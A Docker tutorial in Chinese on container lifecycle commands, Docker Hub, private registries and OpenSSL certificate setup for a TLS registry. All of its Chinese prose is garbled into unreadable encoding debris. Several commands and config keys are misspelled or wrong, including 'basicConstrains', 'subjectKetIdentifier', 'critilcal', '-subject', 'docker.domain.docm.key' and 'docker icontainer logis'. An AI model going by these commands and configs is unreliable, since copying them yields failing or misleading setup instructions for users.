å¯åŠ¨ä¸€ä¸ªbashç»ˆç«¯ï¼Œå…è®¸ç”¨æˆ·è¿›è¡Œäº¤äº’,-té€‰é¡¹è®©Dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯pseudo-ttyå¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¸Šï¼Œ-iåˆ™è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ‰€åˆ›å»ºçš„ç»ˆç«¯æ¥è¾“å…¥å‘½ä»¤docker run -t -i ubuntu:14.04 /bin/bash å½“åˆ©ç”¨ docker runæ¥åˆ›å»ºå®¹å™¨æ—¶ï¼ŒDockeråœ¨åŽå°è¿è¡Œçš„æ ‡å‡†æ“ä½œåŒ…æ‹¬ï¼š æ£€æŸ¥æœ¬åœ°æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é•œåƒï¼Œä¸å­˜åœ¨å°±ä»Žå…±æœ‰ä»“åº“ä¸‹è½½ åˆ©ç”¨é•œåƒåˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨ åˆ†é…ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨åªè¯»çš„é•œåƒå±‚å¤–é¢æŒ‚è½½ä¸€å±‚å¯è¯»å±‚ ä»Žå®¿ä¸»ä¸»æœºé…ç½®çš„ç½‘æ¡¥æŽ¥å£ä¸­æ¡¥æŽ¥ä¸€ä¸ªè™šæ‹ŸæŽ¥å£åˆ°å®¹å™¨ä¸­åŽ» ä»Žåœ°å€æ± é…ç½®ä¸€ä¸ªipåœ°å€ç»™å®¹å™¨ æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„åº”ç”¨ç¨‹åº æ‰§è¡Œå®Œæ¯•åŽå®¹å™¨è¢«ç»ˆæ­¢ å¯åŠ¨å·²ç»ˆæ­¢çš„å®¹å™¨docker container startå‘½ä»¤å¯ä»¥å°†ä¸€ä¸ªå·²ç»ç»ˆæ­¢çš„å®¹å™¨å¯åŠ¨è¿è¡Œã€‚ å®¹å™¨çš„æ ¸å¿ƒä¸ºæ‰€æ‰§è¡Œçš„åº”ç”¨ç¨‹åºï¼Œæ‰€éœ€è¦çš„èµ„æºéƒ½æ˜¯åº”ç”¨ç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰å…¶ä»–èµ„æºã€‚å¯ä»¥åœ¨ä¼ªç»ˆç«¯ä¸­åˆ©ç”¨psæˆ–topæ¥æŸ¥è¿›ç¨‹ä¿¡æ¯ å®ˆæŠ¤æ€è¿è¡Œæ›´å¤šæ—¶å€™ï¼Œéœ€è¦è®©Dockeråœ¨åŽå°è¿è¡Œè€Œä¸æ˜¯ç›´æŽ¥æŠŠæ‰§è¡Œå‘½ä»¤çš„ç»“æžœè¾“å‡ºåœ¨å½“å‰å®¿ä¸»æœºä¸‹ã€‚å¯ä»¥é€šè¿‡æ·»åŠ  -då‚æ•°å®žçŽ°ã€‚ ä¸ç”¨ -då‚æ•°è¿è¡Œå®¹å™¨ï¼š 12345docker run ubuntu:17.10 /bin/sh -c "while true;do echo hello world;sleep 1;done"hello worldhello worldhello worldhello world å®¹å™¨ä¼šæŠŠè¾“å‡ºç»“æžœstdoutæ‰“å°åˆ°å®¿ä¸»ä¸»æœºä¸Šé¢ å¦‚æžœä½¿ç”¨äº† -då‚æ•°è¿è¡Œå®¹å™¨ 12docker run -d ubuntu:17.10 /bin/sh -c "while true;do echo hello world; sleep 1;done"77b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a æ­¤æ—¶å®¹å™¨ä¼šåœ¨åŽå°è¿è¡Œå¹¶ä¸ä¼šæŠŠè¾“å‡ºç»“æžœæ‰“å°åˆ°å®¿ä¸»æœºä¸Šé¢ï¼ˆè¾“å‡ºç»“æžœå¯ä»¥ç”¨docker logsæŸ¥çœ‹ï¼‰ã€‚ æ³¨ï¼šå®¹å™¨æ˜¯å¦ä¼šé•¿ä¹…è¿è¡Œï¼Œå’Œ docker run æŒ‡ä»¤çš„å‘½ä»¤æœ‰å…³ï¼Œå’Œ -då‚æ•°æ— å…³ã€‚ ä½¿ç”¨ -då‚æ•°å¯åŠ¨åŽè¿”å›žä¸€ä¸ªå”¯ä¸€çš„idï¼Œå¯ä»¥é€šè¿‡ docker container lså‘½ä»¤æ¥æŸ¥çœ‹å®¹å™¨ä¿¡æ¯ 12345678910docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77b2dc01fe0f ubuntu:17.10 /bin/sh -c 'while tr 2 minutes ago Up 1 minute agitated_wright# é€šè¿‡ docker icontainer logisèŽ·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯docker container logs[container ID or NEWS]hello worldhello worldhello worldhello world ç»ˆæ­¢ä½¿ç”¨ docker container stop æ¥ç»ˆæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ å½“Docker å®¹å™¨ä¸­æŒ‡å®šçš„åº”ç”¨ç»ˆç»“æ—¶ï¼Œå®¹å™¨ä¹Ÿä¼šè‡ªåŠ¨ç»ˆæ­¢ã€‚ä¸Šé¢åªå¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡exitæˆ–è€…ctrl+dæ¥æŽ¨å‡ºç»ˆç«¯ï¼Œæ‰€åˆ›å»ºçš„å®¹å™¨ç«‹åˆ»ç»ˆæ­¢ã€‚ ç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨å¯ä»¥ä½¿ç”¨ docker containers ls -aå‘½ä»¤çœ‹åˆ°ä¾‹å¦‚ï¼š 1234docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESba267838cc1b ubuntu:14.04 "/bin/bash" 30 minutes ago Exited (0) About a minute ago trusting_newton98e5efa7d997 training/webapp:latest "python app.py" About an hour ago Exited (0) 34 minutes ago backstabbing_pike ç„¶åŽé€šè¿‡ docker run restartå‘½ä»¤ä¼šè®©ä¸€ä¸ªè¿è¡Œæ€çš„å®¹å™¨ç»ˆæ­¢ï¼Œç„¶åŽå†é‡æ–°å¯åŠ¨å®ƒã€‚ è¿›å…¥å®¹å™¨ä½¿ç”¨ -då‚æ•°æ—¶ï¼Œå®¹å™¨å¯åŠ¨åŽä¼šè¿›å…¥åŽå°ã€‚æŸäº›æ—¶å€™éœ€è¦è¿›å…¥å®¹å™¨æ“ä½œï¼ŒåŒ…æ‹¬docker attchå‘½ä»¤æˆ–docker execå‘½ä»¤ï¼ŒæŽ¨èä½¿ç”¨docker exec attchå‘½ä»¤docker attchæ˜¯Dockerè‡ªå¸¦å‘½ä»¤ 1234567891011docker run -dit ubuntu243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES243c32535da7 ubuntu:latest "/bin/bash" 18 seconds ago Up 17 seconds nostalgic_hypatiadocker attach 243croot@243c32535da7:/## å¦‚æžœä»Žè¿™ä¸ªstdinä¸­exitï¼Œä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ execå‘½ä»¤-i -tå‚æ•° docker execå¯ä»¥è·Ÿå¤šä¸ªå‚æ•° åªç”¨ -iå‚æ•°æ—¶ï¼Œç”±äºŽæ²¡æœ‰åˆ†é…ä¼ªç»ˆç«¯ï¼Œç•Œé¢æ²¡æœ‰Linuxå‘½ä»¤ç¬¦ï¼Œä½†å‘½ä»¤æ‰§è¡Œç»“æžœä»ç„¶å¯ä»¥è¿”å›ž å½“ -i/-tå‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¯ä»¥çœ‹åˆ°Linuxå‘½ä»¤æç¤ºç¬¦ 12345678910111213141516docker run -dit ubuntu69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES69d137adef7a ubuntu:latest "/bin/bash" 18 seconds ago Up 17 seconds zealous_swirlesdocker exec -i 69d1 bashls binbootdev...docker exec -it 69d1 bashroot@xxx:/# å¦‚æžœä»Žè¿™ä¸ªstdinä¸­exitï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæŽ¨èä½¿ç”¨ docker execçš„åŽŸå›  å¯¼å‡ºå’Œå¯¼å…¥å®¹å™¨å¯¼å‡ºå®¹å™¨123456docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7691a814370e ubuntu:14.04 "/bin/bash" 36 hours ago Exited (0) 21 hours ago testdocker export 7691a814370e &gt; ubuntn.tar#è¿™æ ·å¯¼å‡ºå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°æ–‡ä»¶ å¯¼å…¥å®¹å™¨å¿«ç…§12345678910# docker import ä»Žå®¹å™¨å¿«ç…§æ–‡ä»¶ä¸­å†å¯¼å…¥ä¸ºé•œåƒcat ubuntu.tar | docker import - test/ubuntu:v1.0docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEtest/ubuntu v1.0 9d37a6082e97 About a minute ago 171.3 MB# æŒ‡å®šURLæˆ–è€…æŸä¸ªç›®å½•æ¥å½•å…¥docker import http://example.com/exampleimage.tgz example/imagerepo# ç”¨æˆ·æ—¢å¯ä»¥ä½¿ç”¨ docker load æ¥å¯¼å…¥é•œåƒå­˜å‚¨æ–‡ä»¶åˆ°æœ¬åœ°é•œåƒåº“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ docker import æ¥å¯¼å…¥ä¸€ä¸ªå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°é•œåƒåº“ã€‚è¿™ä¸¤è€…åŒºåˆ«åœ¨äºŽå®¹å™¨å¿«ç…§æ–‡ä»¶å°†ä¸¢å¼ƒæ‰€æœ‰åŽ†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯ï¼ˆå³ä¿å­˜å®¹å™¨å½“æ—¶çš„å¿«ç…§çŠ¶æ€ï¼‰ï¼Œè€Œé•œåƒå­˜å‚¨æ–‡ä»¶å°†ä¿å­˜å®Œæ•´è®°å½•ï¼Œä½“ç§¯ä¹Ÿè¦å¤§ï¼Œæ­¤å¤–ï¼Œä»Žå®¹å™¨å¿«ç…§æ–‡ä»¶å¯¼å…¥æ—¶å¯ä»¥é‡æ–°åˆ¶å®šæ ‡ç­¾ç­‰å…ƒæ•°æ®ä¿¡æ¯ åˆ é™¤12docker container rm hahahaha åˆ é™¤ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ï¼Œå¯ä»¥æ·»åŠ  -fï¼ŒDockerä¼šå‘é€ SIGKILLä¿¡å·ç»™å®¹å™¨ æ¸…ç†æ‰€æœ‰å¤„äºŽç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨: 1docker container prune è®¿é—®ä»“åº“ä»“åº“Repositoryæ˜¯é›†ä¸­å­˜æ”¾é•œåƒçš„åœ°æ–¹ã€‚ ä¸€ä¸ªå®¹æ˜“æ··æ·†çš„æ¦‚å¿µæ˜¯æ³¨å†ŒæœåŠ¡å™¨ï¼ˆRegistryï¼‰ã€‚å®žé™…ä¸Šæ³¨å†ŒæœåŠ¡å™¨æ˜¯ç®¡ç†ä»“åº“çš„å…·ä½“æœåŠ¡å™¨ï¼Œæ¯ä¸ªæœåŠ¡å™¨å¯ä»¥æœ‰å¤šä¸ªä»“åº“ï¼Œè€Œæ¯ä¸ªä»“åº“ä¸‹é¢å¯ä»¥æœ‰å¤šä¸ªé•œåƒã€‚ä»Žè¿™æ–¹é¢æ¥è¯´ï¼Œä»“åº“è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå…·ä½“çš„é¡¹ç›®æˆ–è€…ç›®å½•ã€‚ä¾‹å¦‚å¯¹äºŽ ä»“åº“åœ°å€dl.dockerpool.com/ubuntuæ¥è¯´ï¼Œdl.dockerpool.comæ˜¯æ³¨å†ŒæœåŠ¡å™¨åœ°å€ï¼Œubuntuæ˜¯ä»“åº“åã€‚å¤§éƒ¨åˆ†æ—¶å€™å¹¶ä¸éœ€è¦ä¸¥æ ¼åŒºåˆ†è¿™ä¸¤è€…çš„æ¦‚å¿µ Docker HubDockerå®˜æ–¹ç»´æŠ¤äº†ä¸€ä¸ªå…¬å…±ä»“åº“Docker Hubï¼Œå¤§éƒ¨åˆ†éœ€æ±‚å¯ä»¥åœ¨Docker Hubä¸­ç›´æŽ¥ä¸‹è½½é•œåƒå®žçŽ° åœ¨ https://cloud.docker.com å…è´¹æ³¨å†Œä¸€ä¸ª Docker è´¦å·ï¼Œé€šè¿‡docker loginå‘½ä»¤äº¤äº’å¼è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å®Œæˆåœ¨å‘½ä»¤è¡Œç™»å½•ï¼Œdocker logouté€€å‡ºç™»å½•ã€‚ docker searchå‘½ä»¤æŸ¥æ‰¾å®˜æ–¹ä»“åº“é•œåƒï¼Œåˆ©ç”¨ docker pullå‘½ä»¤å°†å®ƒä¸‹è½½åˆ°æœ¬åœ° 1234567891011# centosä¸ºå…³é”®è¯docker search centosNAME DESCRIPTION STARS OFFICIAL AUTOMATEDcentos The official build of CentOS. 465 [OK]tianon/centos CentOS 5 and 6, created using rinse instea... 28blalor/centos Bare-bones base CentOS 6.5 image 6 [OK]saltstack/centos-6-minimal 6 [OK]tutum/centos-6.4 DEPRECATED. Use tutum/centos:6.4 instead. ... 5 [OK]# å¯ä»¥çœ‹åˆ°è¿”å›žåŒ…å«å…³é”®å­—çš„é•œåƒï¼Œå…¶ä¸­åŒ…æ‹¬é•œåƒåå­—ã€æè¿°ã€æ”¶è—æ•°ï¼ˆè¡¨ç¤ºè¯¥é•œåƒçš„å—å…³æ³¨ç¨‹åº¦ï¼‰ã€æ˜¯å¦å®˜æ–¹åˆ›å»ºã€æ˜¯å¦è‡ªåŠ¨åˆ›å»ºã€‚å®˜æ–¹çš„é•œåƒè¯´æ˜Žæ˜¯å®˜æ–¹é¡¹ç›®ç»„åˆ›å»ºå’Œç»´æŠ¤çš„ï¼Œautomatedèµ„æºå…è®¸ç”¨æˆ·éªŒè¯é•œåƒçš„æ¥æºå’Œå†…å®¹ã€‚æ ¹æ®æ˜¯å¦å®˜æ–¹æä¾›ï¼Œèµ„æºé•œåƒå¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼š# ä¸€ç§æ˜¯ç±»centorè¿™æ ·çš„é•œåƒï¼Œè¢«ç§°ä¸ºåŸºç¡€é•œåƒæˆ–æ ¹é•œåƒã€‚è¿™äº›åŸºç¡€é•œåƒç”±Dockerå…¬å¸åˆ›å»ºã€éªŒè¯ã€æ”¯æŒã€æä¾›ã€‚è¿™æ ·çš„é•œåƒå¾€å¾€ä½¿ç”¨å•ä¸ªåè¯ä½œä¸ºåå­—# è¿˜æœ‰ä¸€ç§ç±»åž‹ï¼Œæ¯”å¦‚tianon/centosé•œåƒï¼Œç”±Dockerç”¨æˆ·åˆ›å»ºå¹¶ç»´æŠ¤çš„ï¼Œå¾€å¾€å¸¦æœ‰ç”¨æˆ·åç§°å‰ç¼€ï¼Œå¯ä»¥é€šè¿‡å‰ç¼€username/æ¥æŒ‡å®šæŸä¸ªç”¨æˆ·åæä¾›çš„é•œåƒï¼Œæ¯”å¦‚tianonç”¨æˆ· æŸ¥æ‰¾çš„æ—¶å€™é€šè¿‡ --filter=stars=Nå‚æ•°å¯ä»¥æŒ‡å®šä»…æ˜¾ç¤ºæ”¶è—æ•°é‡ä¸ºNä»¥ä¸Šçš„é•œåƒ æŽ¨é€é•œåƒç”¨æˆ·ç™»å½•åŽé€šè¿‡docker pushæŽ¨é€è‡ªå·±çš„é•œåƒåˆ°Docker Hubã€‚ 12345678910111213# usernameæ›¿æ¢ä¸ºDocker è´¦æˆ·ç”¨æˆ·ådocker tag ubuntu:17.10 username/ubuntu:17.10docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 17.10 275d79972a86 6 days ago 94.6MBusername/ubuntu 17.10 275d79972a86 6 days ago 94.6MBdocker push username/ubuntu:17.10docker search usernameNAME DESCRIPTION STARS OFFICIAL AUTOMATEDusername/ubuntu è‡ªåŠ¨åˆ›å»ºAutomated BuildsåŠŸèƒ½å¯¹äºŽéœ€è¦ç»å¸¸å‡çº§é•œåƒå†…ç¨‹åºæ¥è¯´ï¼Œååˆ†æ–¹ä¾¿ã€‚ ç”¨æˆ·åˆ›å»ºäº†é•œåƒï¼Œå®‰è£…äº†æŸä¸ªè½¯ä»¶ï¼Œå¦‚æžœè½¯ä»¶å‘å¸ƒæ–°ç‰ˆæœ¬åˆ™éœ€è¦æ‰‹åŠ¨æ›´æ–°é•œåƒã€‚è€Œè‡ªåŠ¨åˆ›å»ºè¿è¡Œç”¨æˆ·é€šè¿‡Docker HubæŒ‡å®šä¸€ä¸ªè·Ÿè¸ªç½‘ç«™ä¸Šçš„é¡¹ç›®ï¼ŒGithub/BitBucketç­‰ï¼Œä¸€æ—¦é¡¹ç›®å‘ç”Ÿæ–°çš„æäº¤æˆ–è€…åˆ›å»ºæ–°çš„æ ‡ç­¾ï¼ŒDocker Hubä¼šè‡ªåŠ¨æž„å»ºé•œåƒå¹¶æŽ¨é€åˆ° Docker Hubä¸­ é…ç½®è‡ªåŠ¨åˆ›å»ºï¼Œæœ‰å‡ ä¸ªæ­¥éª¤ï¼š åˆ›å»ºå¹¶ç™»é™†Docker Hubï¼Œä»¥åŠç›®æ ‡ç½‘ç«™ åœ¨ç›®æ ‡ç½‘ç«™ä¸­è¿žæŽ¥è´¦æˆ·åˆ°Docker Hub åœ¨Docker Hubä¸­é…ç½®ä¸€ä¸ªè‡ªåŠ¨åˆ›å»º é€‰å–ä¸€ä¸ªç›®æ ‡ç½‘ç«™çš„é¡¹ç›®ï¼ˆéœ€å«æœ‰Dockerfileï¼‰å’Œåˆ†æ”¯ æŒ‡å®šDockerfileçš„ä½ç½®ï¼Œå¹¶æäº¤åˆ›å»º ä¹‹åŽå¯ä»¥åœ¨Docker Hubçš„è‡ªåŠ¨åˆ›å»ºé¡µé¢ä¸­è·Ÿè¸ªæ¯æ¬¡åˆ›å»ºçš„çŠ¶æ€ ç§æœ‰ä»“åº“ç”¨æˆ·å¯ä»¥åˆ›å»ºä¸€ä¸ªæœ¬åœ°ä»“åº“ä¾›ç§äººä½¿ç”¨ docker-registryæ˜¯å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œç”¨æˆ·æž„å»ºç§æœ‰é•œåƒåº“ å®‰è£…docker-registryé€šè¿‡å®˜æ–¹registryé•œåƒæ¥è¿è¡Œ 1docker run -d -p 5000:5000 --restart=always --name registry registry è¿™å°†ä½¿ç”¨å®˜æ–¹çš„registryé•œåƒæ¥å¯åŠ¨ç§æœ‰ä»“åº“ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä»“åº“ä¼šè¢«åˆ›å»ºåœ¨å®¹å™¨çš„ /var/lib/registryç›®å½•ä¸‹ï¼Œå¯ä»¥é€šè¿‡-vå‚æ•°æŒ‡å®šé•œåƒæ–‡ä»¶å­˜åœ¨æœ¬åœ°çš„æŒ‡å®šè·¯å¾„ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­å°†ä¸Šä¼ çš„é•œåƒæ”¾åˆ°æœ¬åœ°çš„/opt/data/registry 1234docker run -d \ -p 5000:5000 -v /opt/data/registry:/var/lib/registry \ registry ä¸Šä¼ ã€æœç´¢ã€ä¸‹è½½åˆ›å»ºå¥½ç§æœ‰ä»“åº“åŽï¼Œå¯ä»¥ä½¿ç”¨docker tagæ¥æ ‡è®°ä¸€ä¸ªé•œåƒï¼Œç„¶åŽå°†å®ƒæŽ¨é€åˆ°ä»“åº“ï¼Œä¾‹å¦‚ç§æœ‰ä»“åº“åœ°å€ä¸º 127.0.0.1:5000,çŽ°åœ¨æœ¬æœºå·²æœ‰çš„é•œåƒ 123$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEubuntu latest ba5877dc9bec 6 weeks ago 192.7 MB docker tagå°† ubuntu:latesté•œåƒæ ‡è®°ä¸º 127.0.0.1:5000/ubuntu/:latestï¼Œæ ¼å¼ä¸ºï¼š docker tag IMAGE[:TAG] [REGISTRT_HOST[:REGISTRY_PROT]/]REGISTORY[:TAG] 12345docker tag ubuntu:latest 127.0.0.1:5000/ubuntu:latestdocker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEubuntu latest ba5877dc9bec 6 weeks ago 192.7 MB127.0.0.1:5000/ubuntu:latest latest ba5877dc9bec 6 weeks ago 192.7 MB docker pushä¸Šä¼ æ ‡è®°çš„é•œåƒ 123456789docker push 127.0.0.1:5000/ubtuntu:latestThe push refers to repository [127.0.0.1:5000/ubuntu]373a30c24545: Pusheda9148f5200b0: Pushedcdd3de0940ab: Pushedfc56279bbb33: Pushedb38367233d37: Pushed2aebd096e0e2: Pushedlatest: digest: sha256:fe4277621f10b5026266932ddf760f5a756d2facd505a94d2da12f4f52f71f5a size: 1568 curlæŸ¥çœ‹ä»“åº“ä¸­çš„é•œåƒ 12curl 127.0.0.1:5000/v2/_catalog&#123;"repositories":["ubuntu"]&#125; åˆ é™¤å·²æœ‰çš„é•œåƒä»Žç§æœ‰ä»“åº“ä¸‹è½½é•œåƒ 1234567891011121314docker image rm 127.0.0.1:5000/ubuntu:latestdocker pull 127.0.0.1:5000/ubuntu:latestPulling repository 127.0.0.1:5000/ubuntu:latestba5877dc9bec: Download complete511136ea3c5a: Download complete9bad880da3d2: Download complete25f11f5fb0cb: Download completeebc34468f71d: Download complete2318d26665ef: Download complete$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZE127.0.0.1:5000/ubuntu:latest latest ba5877dc9bec 6 weeks ago 192.7 MB æ³¨æ„äº‹é¡¹å¦‚æžœä¸æƒ³ä½¿ç”¨ 127.0.0.1:5000 ä½œä¸ºä»“åº“åœ°å€ï¼Œæ¯”å¦‚æƒ³è®©æœ¬ç½‘æ®µçš„å…¶ä»–ä¸»æœºä¹Ÿèƒ½æŠŠé•œåƒæŽ¨é€åˆ°ç§æœ‰ä»“åº“ã€‚å¾—æŠŠä¾‹å¦‚ 192.168.199.100:5000 è¿™æ ·çš„å†…ç½‘åœ°å€ä½œä¸ºç§æœ‰ä»“åº“åœ°å€ï¼Œè¿™æ—¶ä¼šå‘çŽ°æ— æ³•æˆåŠŸæŽ¨é€é•œåƒã€‚ è¿™æ˜¯å› ä¸º Docker é»˜è®¤ä¸å…è®¸éž HTTPS æ–¹å¼æŽ¨é€é•œåƒã€‚é€šè¿‡ Docker çš„é…ç½®é€‰é¡¹æ¥å–æ¶ˆè¿™ä¸ªé™åˆ¶. Ubuntu 14.04, Debian 7 Wheezyå¯¹äºŽä½¿ç”¨ upstart çš„ç³»ç»Ÿè€Œè¨€ï¼Œç¼–è¾‘ /etc/default/docker æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­çš„ DOCKER_OPTS ä¸­å¢žåŠ å¦‚ä¸‹å†…å®¹ï¼š 1DOCKER_OPTS="--registry-mirror=https://registry.docker-cn.com --insecure-registries=192.168.199.100:5000" é‡æ–°å¯åŠ¨æœåŠ¡ã€‚ 1$ sudo service docker restart Ubuntu 16.04+, Debian 8+, centos 7å¯¹äºŽä½¿ç”¨ systemd çš„ç³»ç»Ÿï¼Œè¯·åœ¨ /etc/docker/daemon.json ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼ˆå¦‚æžœæ–‡ä»¶ä¸å­˜åœ¨æ–°å»ºè¯¥æ–‡ä»¶ï¼‰ 12345678&#123; "registry-mirror": [ "https://registry.docker-cn.com" ], "insecure-registries": [ "192.168.199.100:5000" ]&#125; æ³¨æ„ï¼šè¯¥æ–‡ä»¶å¿…é¡»ç¬¦åˆ json è§„èŒƒï¼Œå¦åˆ™ Docker å°†ä¸èƒ½å¯åŠ¨ã€‚ å…¶ä»–å¯¹äºŽ Docker for Windows ã€ Docker for Mac åœ¨è®¾ç½®ä¸­ç¼–è¾‘ daemon.json å¢žåŠ å’Œä¸Šè¾¹ä¸€æ ·çš„å­—ç¬¦ä¸²å³å¯ã€‚ ç§æœ‰ä»“åº“é«˜çº§é…ç½®åˆ©ç”¨Docker Compose æ­å»ºä¸€ä¸ªæ‹¥æœ‰æƒé™è®¤è¯ã€TLSçš„ç§æœ‰ä»“åº“ã€‚æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä»¥ä¸‹æ­¥éª¤åœ¨è¯¥æ–‡ä»¶å¤¹é•œåƒ å‡†å¤‡ç«™ç‚¹è¯ä¹¦å›½å†…å„å¤§äº‘æœåŠ¡å•†æä¾›å…è´¹çš„ç«™ç‚¹è¯ä¹¦ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨opensslè‡ªè¡Œç­¾å‘è¯ä¹¦ã€‚å‡è®¾è¦æ­å»ºçš„ç§æœ‰ä»“åº“åœ°å€ä¸ºdocker.domain.comï¼Œä½¿ç”¨opensslè‡ªè¡Œç­¾å‘docker.domain.comçš„ç«™ç‚¹SSLè¯ä¹¦ ç¬¬ä¸€æ­¥åˆ›å»ºCAç§é’¥ openssl genrsa -out â€œroot-ca.keyâ€ 4096 ç¬¬äºŒæ­¥åˆ©ç”¨ç§é’¥åˆ›å»ºCAæ ¹è¯ä¹¦è¯·æ±‚æ–‡ä»¶ 123456openssl req \ -new -key "root-ca.key" \ -out "root-ca.ssr" -sha256 \ -subj '/C=CN/ST/Shanxi/L=Datong/O=Your Company Name Name/CN=Your Company Name Docker Registry CA' # -subjå‚æ•°é‡Œé¢çš„/Cä»£è¡¨å›½å®¶ï¼Œ/STè¡¨ç¤ºçœï¼Œ/Lè¡¨ç¤ºåŸŽå¸‚æˆ–è€…åœ°åŒºï¼Œ/Oè¡¨ç¤ºç»„ç»‡åï¼Œ/CNé€šç”¨åç§° ç¬¬ä¸‰æ­¥åˆ›å»ºCAæ ¹è¯ä¹¦æ–°å»ºroot-ca.cnf 1234[root_ca]basicConstrains = critical,CA:TRUE,pathlen:1keyUsage = critical,nonRepudiation,cRLSign,keyCertSignsubjectKetIdentifier=hash ç¬¬å››æ­¥ç­¾å‘æ ¹è¯ä¹¦ 1234openssl x509 -req -days 3650 -in "root-ca.csr" \ -signkey "root-ca.key" -sha256 -out "root-ca.crt" \ -extfile "root-ca.cnf" -extensions \ root_ca ç¬¬äº”æ­¥ç”Ÿæˆç«™ç‚¹SSLç§é’¥ 1openssl genrsa -out "docker.domain.com.key" 4096 ç¬¬å…­æ­¥ä½¿ç”¨ç§é’¥ç”Ÿæˆè¯ä¹¦è¯·æ±‚æ–‡ä»¶ 12openssl req -new -key "docker.domain.docm.key" -out "site.csr" -sha256 \ -subject '/C=CN/ST=ShanXi/L=Datong/O=Your Company Name/CN=docker.domain.com' ç¬¬ä¸ƒæ­¥é…ç½®è¯ä¹¦ï¼Œæ–°å»ºsite.cnfæ–‡ä»¶ 1234567[server]authorityKeyIdentifier=keyid,issuerbasicConstraints = critilcal,CA:FALSEextendedKeyUsage=serverAuthKeyUsage = critical,digitalSignature,keyEnciphermentsubjectAltName = DNS:docker.domain.com,IP:127.0.0.1subjectKeyIdentifier=hash ç¬¬å…«æ­¥ç­¾ç½²ç«™ç‚¹SSLè¯ä¹¦ 123openssl x509 -req -days 750 -in "site.csr" -sha256 \ -CA "root-ca.crt" -CAkey "root-ca.key" -CAcreateserial \ -out "docker.domain.com.crt" -extfile "site.cnf" -extensions server è¿™æ ·å°±æ‹¥æœ‰äº†docker.domain.comçš„ç½‘ç«™SSLç§é’¥docker.domain.com.keyå’ŒSSLè¯ä¹¦docker.domain.com.crtä»¥åŠCAæ ¹è¯ä¹¦root-ca.crt æ–°å»ºsslæ–‡ä»¶å¤¹å°†docker.domain.com.keyã€docker.domain.com.crtã€root-ca.crtè¿™ä¸‰ä¸ªæ–‡ä»¶ç§»å…¥ï¼Œåˆ é™¤å…¶ä»–æ–‡ä»¶ é…ç½®ç§æœ‰ä»“åº“ç§æœ‰ä»“åº“é»˜è®¤çš„é…ç½®æ–‡ä»¶ä½äºŽ /etc/docker/registry/config.ymlï¼ŒçŽ°åœ¨æœ¬åœ°ç¼–è¾‘ config.ymlï¼Œä¹‹åŽæŒ‚è½½åˆ°å®¹å™¨ä¸­ 12345678910111213141516171819202122232425262728293031323334version: 0.1log: accesslog: disabled: true level: debug formatter: text fields: service: registry environment: stagingstorage: delete: enabled: true cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registryauth: htpasswd: realm:basic-realm path: /etc/docker/registry/auth/nginx.htpasswdhttp: addr: :443 host: http://docker.domain.com headers: X-Content-Type-Options: [nosniff] http2: disabled: false tls: certificate: /etc/docker/registry/ssl/docker.domain.com.crt key: /etc/docker/registry/ssl/docker.domain.com.keyhealth: storagedrive: true interval: 10sthreshold: 3 ç”Ÿæˆhttpè®¤è¯æ–‡ä»¶123456mkdir authdocker run --rm \ --entrypoint htpasswd \ registry \ -Bbn username password &gt; auth/nginx.htpasswd# username passwordå¯¹åº”ç”¨æˆ·åå’Œå¯†ç  ç¼–è¾‘ docker-compose.yml 123456789101112version: '3'services: registry: image: registry ports: - "443:443" volumes: - ./:/etc/docker/registry - registry-data:/var/lib/registryvolumes: registry-data: ä¿®æ”¹hostsç¼–è¾‘ 